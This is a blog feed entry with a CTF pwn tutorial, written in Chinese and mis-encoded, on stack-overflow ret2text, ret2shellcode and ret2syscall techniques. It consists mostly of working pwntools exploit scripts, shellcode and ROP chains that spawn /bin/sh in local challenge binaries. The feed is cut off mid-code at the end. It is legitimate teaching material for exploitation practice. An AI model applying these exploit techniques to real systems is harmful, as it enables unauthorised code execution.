<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>PWNLing-BlogğŸ¥</title>
  
  
  <link href="https://pwnling.github.io/atom.xml" rel="self"/>
  
  <link href="https://pwnling.github.io/"/>
  <updated>2023-01-05T13:00:00.000Z</updated>
  <id>https://pwnling.github.io/</id>
  
  <author>
    <name>ç´¢æ€§æ€å¿µæ— å£°à³ƒ</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>æ ˆæº¢å‡ºret2xxç³»åˆ—</title>
    <link href="https://pwnling.github.io/2023/01/05/8-ret2xx%E7%B3%BB%E5%88%97/"/>
    <id>https://pwnling.github.io/2023/01/05/8-ret2xx%E7%B3%BB%E5%88%97/</id>
    <published>2023-01-05T13:00:00.000Z</published>
    <updated>2023-01-05T13:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01é¢„å¤‡çŸ¥è¯†"><a href="#0x01é¢„å¤‡çŸ¥è¯†" class="headerlink" title="0x01é¢„å¤‡çŸ¥è¯†"></a>0x01é¢„å¤‡çŸ¥è¯†</h1><p><strong>*bssæ®µ</strong>é€šå¸¸æ˜¯æŒ‡ç”¨æ¥å­˜æ”¾ç¨‹åºä¸­æœª<strong>åˆå§‹åŒ–çš„å…¨å±€å˜é‡</strong>çš„ä¸€å—å†…å­˜åŒºåŸŸã€‚<em><br>**</em>dataæ®µ<strong>é€šå¸¸å­˜æ”¾ç¨‹åºä¸­</strong>å·²ç»åˆå§‹åŒ–çš„å…¨å±€å˜é‡<strong>çš„ä¸€å—å†…å­˜åŒºåŸŸã€‚<em></em></strong>textæ®µ<strong>æ˜¯å­˜æ”¾ç¨‹åº</strong>æ‰§è¡Œä»£ç <strong>çš„ä¸€å—å†…å­˜åŒºåŸŸï¼Œç§°ä¸ºä»£ç æ®µã€‚<em></em></strong>rodataæ®µ<strong>æ˜¯å­˜æ”¾Cä¸­çš„</strong>å­—ç¬¦ä¸²å’Œ#defineå®šä¹‰çš„å¸¸é‡<em>*</em></p><p><strong>*p32 p64</strong>ï¼šå°†ä¸€ä¸ªæ•°å­—è½¬æ¢ä¸ºå­—ç¬¦<em><br>**</em>u32 u64<em>*ï¼šå°†å­—ç¬¦è½¬æ¢ä¸ºæ•°å­—</em><br><em>æˆ–è€…è¯´p32ã€p64æ˜¯æ‰“åŒ…ä¸ºäºŒè¿›åˆ¶ï¼Œu32ã€u64æ˜¯è§£åŒ…ä¸ºäºŒè¿›åˆ¶</em></p><h1 id="0x02ret2text"><a href="#0x02ret2text" class="headerlink" title="0x02ret2text"></a>0x02ret2text</h1><p><strong>ret2textå°±æ˜¯æ‰§è¡Œç¨‹åºä¸­å·²æœ‰çš„ä»£ç ã€‚</strong>ä¾‹å¦‚ç¨‹åºä¸­å†™æœ‰systemç­‰ç³»ç»Ÿçš„è°ƒç”¨å‡½æ•°ï¼ˆè¿™ä¾¿æ˜¯å·²æœ‰çš„ä»£ç ï¼‰ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨æ§åˆ¶å·²æœ‰çš„gadgetsï¼ˆä»¥retåŠç»“å°¾çš„æŒ‡ä»¤åºåˆ—ï¼Œé€šè¿‡è¿™äº›æŒ‡ä»¤åºåˆ—ï¼Œå¯ä»¥ä¿®æ”¹æŸäº›åœ°å€çš„å†…å®¹ï¼‰æ§åˆ¶systemå‡½æ•°ã€‚</p><h2 id="é¢˜ç›®è§£æ-jarvisoj-level2"><a href="#é¢˜ç›®è§£æ-jarvisoj-level2" class="headerlink" title="é¢˜ç›®è§£æ jarvisoj_level2"></a>é¢˜ç›®è§£æ jarvisoj_level2</h2><h3 id="ä¸ªäººåˆ†æ"><a href="#ä¸ªäººåˆ†æ" class="headerlink" title="ä¸ªäººåˆ†æ"></a>ä¸ªäººåˆ†æ</h3><p>åªè¦æ˜¯æ²¡æœ‰è°ƒç”¨é¢˜ç›®ä¸­çš„å‡½æ•°ï¼Œè¿”å›åœ°å€æ˜¯systemçš„ï¼Œå°±æ²¡æœ‰å‡½æ•°è°ƒç”¨è¿‡ç¨‹ï¼Œåé¢è¦æ¥è™šæ‹Ÿåœ°å€</p><p>32ä½ç¨‹åºä¸­ï¼Œå‚æ•°åœ¨å‡½æ•°åé¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payloadæ„é€ ï¼š</span><br><span class="line">payload = padding + sys_plt + è™šæ‹Ÿåœ°å€ + system()å‚æ•°&quot;/bin/sh&quot;</span><br><span class="line">payload = &#x27;a&#x27;*(0x88+4) + p32(sys) + &#x27;b&#x27;*4 + p32(sh)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./level2&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">sys = <span class="number">0x8048320</span></span><br><span class="line">sh = <span class="number">0x0804a024</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(sys) + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + p32(sh)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="é¢˜ç›®è§£æ-jarvisoj-level2-x64"><a href="#é¢˜ç›®è§£æ-jarvisoj-level2-x64" class="headerlink" title="é¢˜ç›®è§£æ jarvisoj_level2_x64"></a>é¢˜ç›®è§£æ jarvisoj_level2_x64</h2><h3 id="ä¸ªäººåˆ†æ-1"><a href="#ä¸ªäººåˆ†æ-1" class="headerlink" title="ä¸ªäººåˆ†æ"></a>ä¸ªäººåˆ†æ</h3><p>64ä½ç³»ç»Ÿå‡½æ•°è°ƒç”¨ä¼ å‚ä¼˜å…ˆä½¿ç”¨å¯„å­˜å™¨ rdi rsi rdx rcx r8 r9</p><p>64ä½ubuntu18ä»¥ä¸Šç³»ç»Ÿè°ƒç”¨systemå‡½æ•°æ—¶æ˜¯éœ€è¦æ ˆå¯¹é½ï¼Œ32ä½åˆ™ä¸ç”¨è€ƒè™‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payloadæ„é€ ï¼š</span><br><span class="line">payload = padding + rdiå¯„å­˜å™¨ + system()å‚æ•°&quot;/bin/sh&quot; + retæŠ¬æ ˆ +ã€€sys_plt</span><br><span class="line">payload = &#x27;a&#x27;*0x88 + p64(rdi) + p64(sh) + p64(ret) + p64(sys)</span><br></pre></td></tr></table></figure><p>rdiå¯„å­˜å™¨æŸ¥æ‰¾ï¼š<code>ROPgadget --binary level2_x64 --only â€˜pop|retâ€™ | grep â€˜rdiâ€™</code></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./level2_x64&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">rdi = <span class="number">0x00000000004006b3</span></span><br><span class="line">sys = <span class="number">0x4004c0</span></span><br><span class="line">sh = <span class="number">0x600a90</span></span><br><span class="line">ret = <span class="number">0x400644</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(rdi) + p64(sh) + p64(ret) + p64(sys)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x03ret2shellcode"><a href="#0x03ret2shellcode" class="headerlink" title="0x03ret2shellcode"></a>0x03ret2shellcode</h1><p>ret2shellcode å³æ§åˆ¶ç¨‹åºæ‰§è¡Œ shellcode ä»£ç ã€‚shellcode æŒ‡çš„æ˜¯ç”¨äºå®ŒæˆæŸä¸ªåŠŸèƒ½çš„æ±‡ç¼–ä»£ç ï¼Œä¸€èˆ¬é¢˜ç›®æ— systemå’Œâ€œ/bin/shâ€ï¼Œåˆ™åœ¨bssæ®µä¸Šä¼ å…¥shellcode</p><h2 id="è§£æé¢˜ç›®-jarvisoj-level1"><a href="#è§£æé¢˜ç›®-jarvisoj-level1" class="headerlink" title="è§£æé¢˜ç›® jarvisoj_level1"></a>è§£æé¢˜ç›® jarvisoj_level1</h2><h3 id="ä¸ªäººåˆ†æ-2"><a href="#ä¸ªäººåˆ†æ-2" class="headerlink" title="ä¸ªäººåˆ†æ"></a>ä¸ªäººåˆ†æ</h3><p>%pä¼šæ‰“å°å‡º&amp;bufçš„16è¿›åˆ¶åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf[136]; // [esp+0h] [ebp-88h] BYREF</span><br><span class="line"></span><br><span class="line">  printf(&quot;What&#x27;s this:%p?\n&quot;, buf);</span><br><span class="line">  return read(0, buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>p.recvuntil(&quot;What&#39;s this:&quot;)</code>ï¼šå½“æ¥æ”¶åˆ°è¿™å¥è¯æ—¶ï¼Œ<code>int(p.recv(10),16)</code>æ¥æ”¶åé¢çš„å†…å®¹10ä¸ªå­—èŠ‚å†…å®¹ï¼Œå¯èƒ½æ˜¯å› ä¸ºåœ°å€0xffc79bc0åœ¨åŒå¼•å·å†…ï¼Œæ•…è¢«è®¤ä¸ºæ˜¯å­—ç¬¦ï¼Œ<strong>0xffc79bc0</strong>æ˜¯10ä¸ªå­—ç¬¦ï¼Œ<strong>0xff</strong>æ˜¯4ä¸ªå­—ç¬¦ã€‚</p><p><strong>æ€»ç»“ï¼šæ‰“å°å‡ºçš„åœ°å€åœ¨å¼•å·å†…çš„32ä½ç¨‹åºç”¨<code>int(p.recv(10),16)</code></strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># int(p.recv(10),16)</span></span><br><span class="line">q@ubuntu:~/Desktop/HRP/ret2shellcode$ python2 level1_ret2shellcode_exp.py</span><br><span class="line">[!] Could not find executable <span class="string">&#x27;level1&#x27;</span> <span class="keyword">in</span> <span class="variable">$PATH</span>, using <span class="string">&#x27;./level1&#x27;</span> instead</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./level1&#x27;</span> argv=[<span class="string">&#x27;level1&#x27;</span>] : pid 5492</span><br><span class="line">[DEBUG] Received 0x18 bytes:</span><br><span class="line">    <span class="string">&quot;What&#x27;s this:0xffc79bc0?\n&quot;</span></span><br><span class="line">(<span class="string">&#x27;buf_addr =&gt; &#x27;</span>, <span class="string">&#x27;0xffc79bc0&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;buf_addr =&gt; &#x27;</span>, 4291271616)</span><br><span class="line"></span><br><span class="line"><span class="comment"># int(p.recv(4),16)</span></span><br><span class="line">q@ubuntu:~/Desktop/HRP/ret2shellcode$ python2 level1_ret2shellcode_exp.py</span><br><span class="line">[!] Could not find executable <span class="string">&#x27;level1&#x27;</span> <span class="keyword">in</span> <span class="variable">$PATH</span>, using <span class="string">&#x27;./level1&#x27;</span> instead</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./level1&#x27;</span> argv=[<span class="string">&#x27;level1&#x27;</span>] : pid 5473</span><br><span class="line">[DEBUG] Received 0x18 bytes:</span><br><span class="line">    <span class="string">&quot;What&#x27;s this:0xffbfaee0?\n&quot;</span></span><br><span class="line">(<span class="string">&#x27;buf_addr =&gt; &#x27;</span>, <span class="string">&#x27;0xff&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;buf_addr =&gt; &#x27;</span>, 255)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">file_path=<span class="string">&#x27;level1&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;level1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s this:&quot;</span>)</span><br><span class="line">buf = <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line"><span class="comment"># buf = int(p.recv(4),16)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;buf_addr =&gt; &quot;</span>, <span class="built_in">hex</span>(buf))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;buf_addr =&gt; &quot;</span>, buf)</span><br><span class="line">shellcode = asm(shellcraft.sh())<span class="comment">#ç”Ÿæˆshellcode</span></span><br><span class="line">payload = shellcode</span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>+<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>) + p32(buf)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x04-retsyscall"><a href="#0x04-retsyscall" class="headerlink" title="0x04 retsyscall"></a>0x04 retsyscall</h1><h2 id="è§£æé¢˜ç›®-inndy-rop"><a href="#è§£æé¢˜ç›®-inndy-rop" class="headerlink" title="è§£æé¢˜ç›® inndy_rop"></a>è§£æé¢˜ç›® inndy_rop</h2><h3 id="ä¸ªäººåˆ†æ1"><a href="#ä¸ªäººåˆ†æ1" class="headerlink" title="ä¸ªäººåˆ†æ1"></a>ä¸ªäººåˆ†æ1</h3><p>eax=0xbï¼ˆç³»ç»Ÿè°ƒç”¨å·ï¼‰<br>ebx=/bin/sh çš„åœ°å€<br>ecx=0<br>edx=0</p><p>æŸ¥æ‰¾eaxï¼š<code>ROPgadget --binary inndy_rop --only &#39;pop|ret&#39; | grep &#39;eax&#39;</code>ï¼Œå…¶ä»–ç±»ä¼¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">q@ubuntu:~/Desktop/HRP/ret2syscall$ ROPgadget --binary inndy_rop --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br><span class="line">0x08091c74 : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0809d18a : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080b8016 : pop eax ; ret</span><br><span class="line">0x08087312 : pop eax ; ret 0x80c</span><br><span class="line">0x080934a0 : pop eax ; ret 0x80e</span><br><span class="line">0x0809d189 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure><p>int 0x80ï¼š<code>ROPgadget --binary rop --only &#39;int&#39;</code></p><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">file_path=<span class="string">&#x27;./inndy_rop&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./inndy_rop&#x27;</span>)</span><br><span class="line"><span class="comment">#find gadgets</span></span><br><span class="line">int_80_ret = <span class="number">0x0806F430</span><span class="comment">#int 0x80;ret ROPgadgetæ— æ³•æ‰¾åˆ° ropper --file inndy_rop --search &quot;int 0x80&quot;</span></span><br><span class="line">pop_eax_ret = <span class="number">0x080b8016</span><span class="comment"># : pop eax ; ret</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x080481c9</span><span class="comment"># : pop ebx ; ret</span></span><br><span class="line">pop_ecx_ret = <span class="number">0x080de769</span><span class="comment"># : pop ecx ; ret</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0806ecda</span><span class="comment"># : pop edx ; ret</span></span><br><span class="line">bss = <span class="number">0x80e9000</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xc</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span></span><br><span class="line"><span class="comment">#read(0,bss+0x100,8)</span></span><br><span class="line"><span class="comment">#eax = 3</span></span><br><span class="line"><span class="comment">#ebx = fd=0</span></span><br><span class="line"><span class="comment">#ecx = buf=bss+0x100</span></span><br><span class="line"><span class="comment">#edx = 8</span></span><br><span class="line">payload += p32(pop_eax_ret)+p32(<span class="number">0x3</span>)<span class="comment">#eax=3</span></span><br><span class="line">payload += p32(pop_ebx_ret)+p32(<span class="number">0x0</span>)<span class="comment">#ebx=fd=0</span></span><br><span class="line">payload += p32(pop_ecx_ret)+p32(bss+<span class="number">0x100</span>)<span class="comment">#ecx=bss+0x100</span></span><br><span class="line">payload += p32(pop_edx_ret)+p32(<span class="number">0x8</span>)<span class="comment">#edx=8 len(&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">payload += p32(int_80_ret)</span><br><span class="line"><span class="comment">#execve(&quot;/bin/sh&quot;,0,0)</span></span><br><span class="line"><span class="comment">#eax=0xb</span></span><br><span class="line"><span class="comment">#ebx=bss+0x100</span></span><br><span class="line"><span class="comment">#ecx = 0</span></span><br><span class="line"><span class="comment">#edx = 0</span></span><br><span class="line">payload += p32(pop_eax_ret)+p32(<span class="number">0xb</span>)<span class="comment">#eax=3</span></span><br><span class="line">payload += p32(pop_ebx_ret)+p32(bss+<span class="number">0x100</span>)<span class="comment">#ebx=fd=1</span></span><br><span class="line">payload += p32(pop_ecx_ret)+p32(<span class="number">0</span>)<span class="comment">#ecx=bss+0x100</span></span><br><span class="line">payload += p32(pop_edx_ret)+p32(<span class="number">0</span>)<span class="comment">#edx=8 len(&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">payload += p32(int_80_ret)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x0806F430&#x27;)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="ä¸ªäººåˆ†æ2"><a href="#ä¸ªäººåˆ†æ2" class="headerlink" title="ä¸ªäººåˆ†æ2"></a>ä¸ªäººåˆ†æ2</h3><p>ç”±äºé¢˜ç›®æ˜¯é™æ€ç¼–è¯‘ï¼Œä¸”æ ˆæº¢å‡ºå‡½æ•°æ˜¯getsï¼Œè¯»å…¥æ— é™åˆ¶ï¼Œæ•…å¯é‡‡ç”¨å¦‚ä¸‹æ–¹æ³•ï¼Œä½†è‹¥æ˜¯readå‡½æ•°å¯èƒ½æœ‰æ—¶å°±ä¸èƒ½æ— é™è¯»ï¼Œæœ‰æ—¶æœ€å¤šè¯»0x100ä»€ä¹ˆçš„å°±å·²ç»æ˜¯æœ€å¤§çš„</p><p>å¯å‚è€ƒï¼š<a href="http://t.csdn.cn/7DjOz">http://t.csdn.cn/7DjOz</a></p><p><strong>ropperç”Ÿæˆropchain</strong>ï¼š</p><p><code>ropper --file inndy_rop --chain execveropper --file inndy_rop --chain execve</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">q@ubuntu:~/Desktop/HRP/ret2syscall$ ropper --file inndy_rop --chain execveropper --file inndy_rop --chain execve</span><br><span class="line">[INFO] Load gadgets for section: LOAD</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line"></span><br><span class="line">[INFO] ROPchain Generator for syscall execve:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[INFO] </span><br><span class="line">write command into data section</span><br><span class="line">eax 0xb</span><br><span class="line">ebx address to cmd</span><br><span class="line">ecx address to null</span><br><span class="line">edx address to null</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[INFO] Try to create chain which fills registers without delete content of previous filled registers</span><br><span class="line">[*] Try permuation 1 / 24</span><br><span class="line">[INFO] Look for syscall gadget</span><br><span class="line"></span><br><span class="line">[INFO] syscall gadget found</span><br><span class="line">[INFO] generating rop chain</span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"># Generated by ropper ropchain generator #</span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line">p = lambda x : pack(&#x27;I&#x27;, x)</span><br><span class="line"></span><br><span class="line">IMAGE_BASE_0 = 0x08048000 # 487729c3b55aaec43deb2af4c896b16f9dbd01f7e484054d1bb7f24209e2d3ae</span><br><span class="line">rebase_0 = lambda x : p(x + IMAGE_BASE_0)</span><br><span class="line"></span><br><span class="line">rop = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; </span><br><span class="line">rop += &#x27;//bi&#x27;</span><br><span class="line">rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; </span><br><span class="line">rop += rebase_0(0x000a2060)</span><br><span class="line">rop += rebase_0(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret; </span><br><span class="line">rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; </span><br><span class="line">rop += &#x27;n/sh&#x27;</span><br><span class="line">rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; </span><br><span class="line">rop += rebase_0(0x000a2064)</span><br><span class="line">rop += rebase_0(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret; </span><br><span class="line">rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; </span><br><span class="line">rop += p(0x00000000)</span><br><span class="line">rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; </span><br><span class="line">rop += rebase_0(0x000a2068)</span><br><span class="line">rop += rebase_0(0x0000c66b) # 0x0805466b: mov dword ptr [edx], eax; ret; </span><br><span class="line">rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; </span><br><span class="line">rop += rebase_0(0x000a2060)</span><br><span class="line">rop += rebase_0(0x00096769) # 0x080de769: pop ecx; ret; </span><br><span class="line">rop += rebase_0(0x000a2068)</span><br><span class="line">rop += rebase_0(0x00026cda) # 0x0806ecda: pop edx; ret; </span><br><span class="line">rop += rebase_0(0x000a2068)</span><br><span class="line">rop += rebase_0(0x00070016) # 0x080b8016: pop eax; ret; </span><br><span class="line">rop += p(0x0000000b)</span><br><span class="line">rop += rebase_0(0x00027430) # 0x0806f430: int 0x80; ret; </span><br><span class="line">print(rop)</span><br><span class="line">[INFO] rop chain generated!</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><p>æ³¨æ„ä¸¤å¤„è¦æ”¹ï¼š</p><ol><li>å¼€å¤´çš„<code>rop = &#39;&#39;</code> =&gt; <code>rop = b&#39;A&#39;*0xC + b&#39;B&#39;*4</code>    </li><li>ä¸­é—´çš„<code>rop += p(0x0000000b)</code> =&gt; <code>rop += p32(0x0000000b)</code></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./inndy_rop&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">####################################ç›´æ¥ç²˜è´´##############################################</span></span><br><span class="line"></span><br><span class="line">IMAGE_BASE_0 = <span class="number">0x08048000</span> <span class="comment">#</span></span><br><span class="line">rebase_0 = <span class="keyword">lambda</span> x : p32(x + IMAGE_BASE_0)</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0xC</span>+<span class="string">b&#x27;B&#x27;</span>*<span class="number">4</span>                        <span class="comment"># å¡«å……padding</span></span><br><span class="line"></span><br><span class="line">rop += rebase_0(<span class="number">0x00070016</span>) <span class="comment"># 0x080b8016: pop eax; ret; </span></span><br><span class="line">rop += <span class="string">b&#x27;//bi&#x27;</span></span><br><span class="line">rop += rebase_0(<span class="number">0x00026cda</span>) <span class="comment"># 0x0806ecda: pop edx; ret; </span></span><br><span class="line">rop += rebase_0(<span class="number">0x000a2060</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x0000c66b</span>) <span class="comment"># 0x0805466b: mov dword ptr [edx], eax; ret; </span></span><br><span class="line">rop += rebase_0(<span class="number">0x00070016</span>) <span class="comment"># 0x080b8016: pop eax; ret; </span></span><br><span class="line">rop += <span class="string">b&#x27;n/sh&#x27;</span></span><br><span class="line">rop += rebase_0(<span class="number">0x00026cda</span>) <span class="comment"># 0x0806ecda: pop edx; ret; </span></span><br><span class="line">rop += rebase_0(<span class="number">0x000a2064</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x0000c66b</span>) <span 